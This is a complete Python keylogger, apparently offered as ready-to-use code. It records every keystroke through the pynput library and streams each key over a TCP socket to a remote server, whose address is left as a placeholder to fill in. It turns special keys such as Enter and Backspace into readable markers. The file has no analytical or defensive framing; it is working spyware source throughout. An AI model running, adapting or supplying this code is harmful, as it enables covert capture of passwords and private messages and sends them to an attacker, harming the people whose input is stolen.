import socket
from pynput import keyboard

# Server IP and Port (Change to your server's IP and port)
SERVER_IP = 'YOUR IP ADDRESS'  # Your server's IP
SERVER_PORT = 5555           # Server port

# Set up the socket connection to the server
def connect_to_server():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((SERVER_IP, SERVER_PORT))
    return client_socket

# Send keystrokes to the server
def send_keystroke(client_socket, key):
    try:
        client_socket.send(f'{key.char}'.encode())
    except AttributeError:
        # Handle special keys like Enter, Backspace, etc.
        if key == keyboard.Key.space:
            client_socket.send(' '.encode())
        elif key == keyboard.Key.enter:
            client_socket.send('\n'.encode())
        elif key == keyboard.Key.backspace:
            client_socket.send('[BACKSPACE]'.encode())
        elif key == keyboard.Key.tab:
            client_socket.send('\t'.encode())
        else:
            client_socket.send(f'[{key}]'.encode())

# Function to handle key release (optional)
def on_key_release(key):
    if key == keyboard.Key.esc:
        # Stop logging on 'Esc'
        return False

# Start the keylogger
def start_keylogger():
    client_socket = connect_to_server()  # Connect to the server
    with keyboard.Listener(on_press=lambda key: send_keystroke(client_socket, key), on_release=on_key_release) as listener:
        listener.join()

if __name__ == '__main__':
    start_keylogger()
